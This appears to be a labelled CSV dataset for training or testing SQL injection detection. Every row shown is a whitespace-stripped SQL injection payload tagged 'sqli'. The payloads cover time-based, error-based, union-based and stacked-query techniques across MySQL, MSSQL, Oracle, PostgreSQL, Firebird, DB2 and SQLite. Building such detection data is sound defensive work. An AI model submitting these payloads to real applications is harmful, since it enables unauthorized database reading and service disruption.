payload,attack_type,label
1')))or(select*from(select(sleep(5)))ydpu)and((('ljhc'='ljhc,sqli,1
"1""))asgbxxwhere2459=2459waitfordelay'0:0:5'--",sqli,1
"1"")where9223=9223andexp(~(select*from(selectconcat(0x7171706a71,(select(elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1
"1'||(select'xasp'fromdualwhere4025=4025andexp(~(select*from(selectconcat(0x7171706a71,(select(elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",sqli,1
"1"")where8571=8571andelt(4249=4249,7259)--",sqli,1
1)where8232=8232and(3020=3020)*6703--,sqli,1
"1')andelt(4249=4249,7259)and('bxnn'='bxnn",sqli,1
1')assyerwhere3141=3141rlike(select(casewhen(6233=7567)then1else0x28end))--,sqli,1
1'+(selectxruowhere5709=5709and7533=7533)+',sqli,1
"1%')))orelt(6272=6272,sleep(5))and((('%'='",sqli,1
"1"")asjmwrwhere5978=5978rlike(select(casewhen(1396=8762)then1else0x28end))--",sqli,1
"1'))or8466=benchmark(5000000,md5(0x694a4745))and(('jfwt'like'jfwt",sqli,1
"1"")unionallselectnull,null,null,null,null,null,null,null,null--",sqli,1
"1%')))unionallselectnull,null,null,null,null,null,null,null,null--",sqli,1
"1'+(select'gqsk'where3087=3087unionallselectnull,null,null,null--",sqli,1
"1"")askslqwhere8669=8669and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
1%')))rlikesleep(5)and((('%'=',sqli,1
"1""andelt(4594=1040,1040)",sqli,1
"1')orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))and('tetk'='tetk",sqli,1
"-7381'))orelt(5882=5919,5919)and(('nzri'='nzri",sqli,1
-1587')or8339=5540,sqli,1
-6341'or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and'ugys'='ugys,sqli,1
"-4100'))unionallselect1163,1163,1163--",sqli,1
"-4828'+(selectqxnwwhere9488=9488unionallselect9488,9488--",sqli,1
"1'||(select'rask'fromdualwhere9411=9411and4241=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(4241=4241)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113))))||'",sqli,1
"-9176'))aseunwwhere5978=5978or1groupbyconcat(0x7171706a71,(select(casewhen(4232=4232)then1else0end)),0x717a767a71,floor(rand(0)*2))havingmin(0)#",sqli,1
-8625or3176=2519#fvgl,sqli,1
-4761orderby1--,sqli,1
"1%'or8156=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
1')));begindbms_lock.sleep(5);endand((('xzbk'='xzbk,sqli,1
1'||(select'xemx'fromdualwhere4683=4683orsleep(5)#,sqli,1
"1""))orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and((""isbh""like""isbh",sqli,1
"1)))and8407=(selectcount(*)fromgenerate_series(1,5000000))and(((1729=1729",sqli,1
1))or(select*from(select(sleep(5)))sddo)#,sqli,1
"1))asmmbywhere3990=3990and8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
"-1558orelt(3306=2272,2272)--ioxt",sqli,1
"1'))asomwkwhere1414=1414andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1
1')))andsleep(5)and((('vbck'like'vbck,sqli,1
"1'+(selectbyorwhere4538=4538;callregexp_substring(repeat(right(char(3702),0),500000000),null))+'",sqli,1
"-9891""unionallselect7489#",sqli,1
"1%""))andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)and((""%""=""",sqli,1
"1%""));selectlike('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1"";selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3and""rukx""like""rukx",sqli,1
-1700%'or4149=3391#,sqli,1
"1'||(select'iwlj'where8704=8704and(select9067from(selectcount(*),concat(0x7171706a71,(select(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a))||'",sqli,1
"1"")where1416=1416unionallselectnull,null,null#",sqli,1
1';selectpg_sleep(5)and'zfyy'='zfyy,sqli,1
"1"")asfrmpwhere6073=6073;select(casewhen(8689=2468)then8689else1/(select0)end)--",sqli,1
"1%""unionallselectnull,null,null,null#",sqli,1
"1'))asjxvvwhere6593=6593orelt(6272=6272,sleep(5))--",sqli,1
-4384')))or6872=6872and((('ukhl'='ukhl,sqli,1
"1);callregexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1
-1886'where5518=5518or4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4493=4493)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1
"-4588""unionallselect4550,4550,4550,4550#",sqli,1
"1)and(select9067from(selectcount(*),concat(0x7171706a71,(select(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)",sqli,1
-6512'+(select'zdjx'where5454=5454orderby1--,sqli,1
"1));iif(5257=5257,1,1/0)",sqli,1
"1%"")))andchar(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1'))asuvxvwhere6663=6663and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"-2168""))unionallselect4935,4935,4935,4935,4935,4935,4935,4935,4935--",sqli,1
"-4465%'unionallselect6196,6196,6196,6196,6196,6196,6196,6196--",sqli,1
"1)))or2367=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1%')))or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1%"")procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)and(""%""=""",sqli,1
1'))ascjjmwhere1981=1981;select(casewhen(4660=4660)then4660elsecast(1asint)/(select0fromdual)end)fromdual--,sqli,1
"1))ascdhdwhere2958=2958or5356=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"-7813""))asyvylwhere5172=5172unionallselect5172,5172#",sqli,1
1'where6583=6583;selectcasewhen4537=8418then1elsenullend--,sqli,1
1'))rlike(select*from(select(sleep(5)))sgvo)and(('krvo'like'krvo,sqli,1
1')where9175=9175;selectcasewhen7634=3954then1elsenullend--,sqli,1
"-7845'unionallselect9574,9574,9574,9574,9574,9574#",sqli,1
"-1254""or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)",sqli,1
1)and2457=8146,sqli,1
1'||(select'omeg'fromdualwhere4751=4751;selectpg_sleep(5))||',sqli,1
"1'inbooleanmode)andelt(4249=4249,7259)#",sqli,1
"-5911unionallselect2245,2245,2245,2245,2245,2245#",sqli,1
-5067'))or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and(('vkab'like'vkab,sqli,1
"1)asnligwhere5964=5964and2388=benchmark(5000000,md5(0x6d457153))#",sqli,1
"1)))andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)and(((7484=7484",sqli,1
"1"")))andsleep(5)and(((""bvgg""=""bvgg",sqli,1
"1')assagjwhere4558=4558;selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
"1"")ashoivwhere9708=9708andexp(~(select*from(selectconcat(0x7171706a71,(select(elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1
-6680')or5483=3031and('zxes'='zxes,sqli,1
"-8043%"")))ormake_set(9354=9354,7185)and(((""%""=""",sqli,1
"1""andelt(4249=4249,7259)and""kgtz""like""kgtz",sqli,1
"-9062""or6872=6872and""aumq""like""aumq",sqli,1
"-1196""))or1570=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(1570=1570)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and((""srlq""=""srlq",sqli,1
1%'orsleep(5)and'%'=',sqli,1
"1))aszosowhere3633=3633;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"-9661"")))unionallselect2158,2158,2158--",sqli,1
"1"")));(select*from(select(sleep(5)))acdk)#",sqli,1
"1'||(select'bccx'where5881=5881andelt(1210=1210,sleep(5)))||'",sqli,1
"1')and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and('mseo'like'mseo",sqli,1
"1where8948=8948androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)--",sqli,1
-2316')))or8519=6010,sqli,1
1'and9198=9198--,sqli,1
"1,(select*fromgenerate_series(5609,5609,casewhen(5609=5609)then1else0end)limit1)",sqli,1
"1%'andchar(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1'and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and'foju'='foju,sqli,1
"1%"")))and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and(((""%""=""",sqli,1
"1'procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)and'gbpg'='gbpg",sqli,1
-8760)where8277=8277unionallselect8277--,sqli,1
"1%"")));selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
"-8200'where3422=3422or1570=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(1570=1570)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1
"1)))unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
"1%"")));waitfordelay'0:0:5'and(((""%""=""",sqli,1
"-7806""))or(8459=8459)*4906and((""vlrj""like""vlrj",sqli,1
"1""));select(casewhen(4690=4373)then4690else1/(select0)end)--",sqli,1
1where6304=6304;begindbms_lock.sleep(5);end--,sqli,1
"1'||(select'dujx'where6896=6896and2716=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"1)ashlitwhere4973=4973procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"-4285')))unionallselect8819,8819,8819,8819,8819,8819,8819,8819#",sqli,1
"1%')or(select9173from(selectcount(*),concat(0x7171706a71,(select(elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)and('%'='",sqli,1
"1%')))unionallselectnull,null,null,null,null,null--",sqli,1
"-3913""where6085=6085unionallselect6085,6085,6085,6085,6085,6085,6085#",sqli,1
"1'))askxekwhere3429=3429or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
-2022)))or6812=3516and(((3896=3896,sqli,1
"-6580')unionallselect9950,9950,9950,9950,9950,9950--",sqli,1
"1'||(select'wtdz'fromdualwhere1866=1866or4915=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
1%'and3715in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(3715=3715)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and'%'=',sqli,1
"1',(select(casewhen(5586=6403)then1else5586*(select5586frommysql.db)end))",sqli,1
"1%"")or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and(""%""=""",sqli,1
"1""where5845=5845and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"-2860""))orderby1#",sqli,1
"-7802')))orelt(8778=9974,9974)and((('glsq'like'glsq",sqli,1
"1'+(select'midn'where2819=2819or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3))+'",sqli,1
"-9318"")))unionallselect5223,5223,5223,5223#",sqli,1
1')));waitfordelay'0:0:5'and((('ozjl'like'ozjl,sqli,1
1%'waitfordelay'0:0:5'--,sqli,1
"1';callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and'ekhi'='ekhi",sqli,1
"1')))or7417=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1'or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)",sqli,1
"1"")))or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and(((""nthu""like""nthu",sqli,1
1')asgsjrwhere7046=7046andsleep(5)#,sqli,1
"-1908""))unionallselect4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",sqli,1
"-2745'orelt(1032=1032,3623)",sqli,1
"-3827"")or8571=8571--",sqli,1
"-7746')unionallselect1998,1998,1998,1998,1998,1998,1998,1998#",sqli,1
"1',(select(casewhen(1609=1609)thenwaitfordelay'0:0:5'else1609*(select1609frommaster..sysdatabases)end))",sqli,1
"1""))and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and((""fuus""like""fuus",sqli,1
-2348)assigewhere1639=1639or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)--,sqli,1
1'||(select'sdll'where5074=5074or(select*from(select(sleep(5)))ydpu))||',sqli,1
"1')));selectcount(*)fromgenerate_series(1,5000000)and((('ldqq'='ldqq",sqli,1
"1')))orupdatexml(1808,concat(0x2e,0x7171706a71,(select(elt(1808=1808,1))),0x717a767a71),8666)and((('yznn'like'yznn",sqli,1
"-7235"")unionallselect4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",sqli,1
"1%""and1343=5939#",sqli,1
"1"")asvcirwhere6275=6275andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"1%"")andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"1)andelt(3114=3114,sleep(5))#",sqli,1
"1')where4500=4500;iif(5257=5257,1,1/0)",sqli,1
"1%""))rlike(select*from(select(sleep(5)))sgvo)and((""%""=""",sqli,1
"1"")));selectcount(*)fromgenerate_series(1,5000000)and(((""uydm""=""uydm",sqli,1
"1"");select(casewhen(4043=5276)then4043else4043*(select4043frominformation_schema.character_sets)end)#",sqli,1
"1""))asaamhwhere7432=7432(select(casewhen(5451=5451)thenregexp_substring(repeat(right(char(5451),0),500000000),null)elsechar(108)||char(76)||char(112)||char(116)end)frominformation_schema.system_users)--",sqli,1
"1)where9206=9206unionallselectnull,null,null,null,null,null#",sqli,1
1'inbooleanmode)and4457=3885#,sqli,1
"1);createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)",sqli,1
-8045)))orderby1--,sqli,1
"1%')or8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
"-3283)where1948=1948unionallselect1948,1948,1948#",sqli,1
(casewhen8422=8452then1elsenullend),sqli,1
1';selectcasewhen7426=6635then1elsenullend--,sqli,1
"1'))asfjbewhere4662=4662or2367=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1%""))andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"1%"")rlike(select*from(select(sleep(5)))vwyq)#",sqli,1
1%')and(3020=3020)*6703and('%'=',sqli,1
-9484'or(7129=2349)*2349and'fcsa'like'fcsa,sqli,1
-6500'))or(8459=8459)*4906and(('padu'like'padu,sqli,1
"1and6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)#dbzk",sqli,1
"1%"")));begindbms_lock.sleep(5);end--",sqli,1
1))assfanwhere7176=7176and7017=7358,sqli,1
"1'||(select'gopc'where7386=7386andmake_set(9375=7963,7963))||'",sqli,1
-3497'orderby1#,sqli,1
"-9136%"")unionallselect3081,3081,3081,3081,3081,3081,3081#",sqli,1
"1);callregexp_substring(repeat(right(char(3702),0),500000000),null)and(9646=9646",sqli,1
"1'inbooleanmode);selectlike('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
1)));selectsleep(5)#,sqli,1
"1""))asngvfwhere9912=9912or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1'or5356=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
1%'));beginuser_lock.sleep(5);endand(('%'=',sqli,1
"1'))asezpqwhere2976=2976unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
"-1475"")unionallselect8611,8611,8611#",sqli,1
"1)procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"-2102'where3644=3644or5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(5023=5023)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1
1'waitfordelay'0:0:5'and'jree'='jree,sqli,1
1)asywrnwhere1893=1893;select(casewhen(6276=6276)then6276else6276*(select6276frominformation_schema.character_sets)end)#,sqli,1
"1'orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and'nelb'='nelb",sqli,1
"-6595)))unionallselect2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",sqli,1
1')asgdiewhere8133=8133rlike(select(casewhen(7689=7689)then1else0x28end))--,sqli,1
"-5210"")where7176=7176or6872=6872--",sqli,1
"1"")))and(select*from(select(sleep(5)))gcrr)#",sqli,1
"1"")rlike(select(casewhen(5746=5367)then1else0x28end))and(""hnnf""like""hnnf",sqli,1
1)asmtnwwhere7293=7293and2603=5764--,sqli,1
"1"")))andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(((""wute""like""wute",sqli,1
"1%')))or1022=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
-7207'or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and'obxw'='obxw,sqli,1
"1)where3062=3062or8466=benchmark(5000000,md5(0x694a4745))--",sqli,1
"-7731""))ormake_set(2551=4389,4389)and((""unly""like""unly",sqli,1
"1')and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and('fnjm'='fnjm",sqli,1
1'))and(select*from(select(sleep(5)))fzno)and(('tjvy'like'tjvy,sqli,1
1')where4003=4003;selectsleep(5)#,sqli,1
"-9737"")))orderby1--",sqli,1
"1');selectdbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5)fromdual--",sqli,1
"-5776%'unionallselect3075,3075,3075,3075,3075--",sqli,1
"1'+(selectafstwhere7454=7454and3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,1
"1'(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))and'fsvr'='fsvr",sqli,1
(select(casewhen(5792=5792)then5792else1/(select0)end)),sqli,1
"1')orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))and('efwq'like'efwq",sqli,1
"1""where1852=1852unionallselectnull,null,null,null,null,null,null,null,null#",sqli,1
"1))unionallselectnull,null,null,null,null,null,null,null,null--",sqli,1
"1'))andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)and(('wcmt'='wcmt",sqli,1
1'||(select'ldad'where6146=6146rlike(select(casewhen(7689=7689)then1else0x28end)))||',sqli,1
"-9923%')))unionallselect8985,8985,8985,8985,8985,8985,8985#",sqli,1
"1'+(select'nzgq'where7230=7230andelt(1210=1210,sleep(5)))+'",sqli,1
"1"")where4849=4849or8421=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"1)procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)",sqli,1
"1'||(select'qued'where9801=9801procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"1)where7026=7026;callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1'))asicikwhere1440=1440and8189=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1procedureanalyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"1))unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
"1'))aswkyswhere2478=2478and6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(6055=6055)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1
"1"")where9770=9770unionallselectnull,null,null,null,null,null--",sqli,1
"1)))or7417=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"-8472')where3340=3340ormake_set(1752=9905,9905)--",sqli,1
"1'))aslmslwhere3753=3753orelt(5873=5873,sleep(5))#",sqli,1
"1))ashpxwwhere1826=1826unionallselectnull,null,null,null,null,null,null,null#",sqli,1
"1)))and2716=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"1')and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1
"1"")and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and(""udlh""=""udlh",sqli,1
-2679')))or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and((('cutk'like'cutk,sqli,1
"1))and8189=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1')))and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and((('ofko'='ofko",sqli,1
1'||(select'jmhb'where1794=1794or4240=(select4240frompg_sleep(5))--,sqli,1
1));select(casewhen(4769=4769)then4769else4769*(select4769frommysql.db)end)#,sqli,1
"1""where6200=6200andelt(1210=1210,sleep(5))--",sqli,1
"1';callregexp_substring(repeat(right(char(3702),0),500000000),null)and'pczr'='pczr",sqli,1
-2983')or8571=8571--,sqli,1
"-4797'unionallselect8223,8223,8223,8223,8223,8223,8223,8223#",sqli,1
"-8709""or8571=8571--",sqli,1
"1')andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and('pbqg'='pbqg",sqli,1
"1%"")))or4411=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and(((""%""=""",sqli,1
"1"")and(select*from(select(sleep(5)))fzno)and(""zvew""like""zvew",sqli,1
"1'+(select'xqpe'where4020=4020unionallselectnull,null--",sqli,1
1);(select*from(select(sleep(5)))srmq)and(9069=9069,sqli,1
"1""))and(select*from(select(sleep(5)))fzno)and((""ykhp""like""ykhp",sqli,1
-3596)))or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and(((3645=3645,sqli,1
"1))aseigkwhere2557=2557;selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
"-2384'||(select'vhcp'fromdualwhere1266=1266unionallselect1266,1266,1266,1266--",sqli,1
"1')where8163=8163;selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"-2899""))asuyocwhere8417=8417unionallselect8417,8417,8417,8417--",sqli,1
-5751)asjybuwhere4739=4739or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1
"1%')and8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
-5569')ascjafwhere3753=3753unionallselect3753#,sqli,1
"1%"")or(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(8113=8113,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and(""%""=""",sqli,1
"1'+(selectinrvwhere2178=2178or7417=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
1);if(4735=8907)select4735elsedropfunctionqigo--,sqli,1
"1"")unionallselectnull,null,null,null,null,null,null,null,null#",sqli,1
"1')or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and('cqrp'='cqrp",sqli,1
"1"")orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and(""xmrq""=""xmrq",sqli,1
"1'))asovbzwhere3203=3203(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))--",sqli,1
"1')asnoqpwhere4042=4042or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
-7505'))aslqvwwhere8565=8565or6872=6872--,sqli,1
"1"")where4182=4182orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1
"1"")where2180=2180andmake_set(8403=8403,8899)--",sqli,1
"1')asfkpnwhere1100=1100;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"1""))asuzvuwhere2458=2458or(select9173from(selectcount(*),concat(0x7171706a71,(select(elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)--",sqli,1
"1')andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
